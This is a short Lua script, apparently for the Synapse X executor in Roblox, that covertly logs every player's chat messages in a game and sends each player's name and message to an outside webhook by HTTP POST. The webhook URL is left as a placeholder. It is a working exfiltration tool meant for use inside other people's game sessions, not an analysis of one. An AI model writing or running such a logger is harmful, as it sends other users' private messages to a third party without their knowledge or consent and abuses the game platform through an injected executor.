local marketplaceService = game:GetService("MarketplaceService")

local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then

local wh = 'WEBHOOK HERE'
local embed1 = {
       ['title'] =  info.Name,
       ['description'] = tostring(os.date("%m/%d/%y at %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})


function logMsg(Webhook, Players, Message)
   local embed = {
        ['title'] = Players,
        ['description'] = Message.."\n\n" ..tostring(os.date("@ %X"))
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end

game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end
